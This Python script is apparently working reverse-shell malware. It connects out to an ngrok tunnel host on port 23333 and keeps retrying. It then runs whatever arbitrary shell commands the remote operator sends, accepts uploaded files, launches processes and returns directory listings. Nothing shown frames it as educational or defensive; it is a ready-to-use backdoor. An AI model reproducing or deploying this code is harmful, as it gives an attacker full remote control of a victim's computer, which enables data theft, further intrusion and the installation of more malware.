import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64

def restart():
	print('Restarting!!!')
	os.execl(location, __file__)

def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data.encode())

def reliable_recv():
	i = 0
	json_data = ""
	while True:
		try:
			if (i > 100000):
				print('Recv Maximum')
				connection()
			else:
				print('reciving...')
				json_data = json_data + sock.recv(1024).decode()
				return json.loads(json_data)
		except ValueError:
			i += 1
			continue
		except:
			break

def connection():
	x = 0
	while True:
		time.sleep(20)
		try:
			print('connecting...')
			sock.connect(("3.tcp.ngrok.io",23333))
			shell()
		except:
			if x > 5:
				restart()
			else:
				x += 1
				print('fail connection')

def shell():
	while True:
		print('shell load')
		command = reliable_recv()
		print(command)
		if command == "q":
			print('break')
			break
		elif command[:2] == "cd" and len(command[3:]) > 1:
			try:
				os.chdir(command[3:])
				reliable_send(os.getcwd())
			except:
				continue

		elif command[:6] == "upload":
			try:
				with open(command[7:], "wb") as fin:
					result = reliable_recv()
					fin.write(base64.b64decode(result))
					reliable_send('Upload Complit')
			except:
				reliable_send('Error')

		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] started!")
			except:
				reliable_send("[!!] Failed to Start!")

		elif command[:4] == "list":
			try:
				reliable_send(os.listdir())
			except Exception as e: 
				print(e)
				reliable_send("[!!] Cant Execute That Command")
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result.decode('cp862',errors='replace'))	
			except Exception as e: 
				print(e)
				reliable_send("[!!] Cant Execute That Command")

print('Hello World')
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()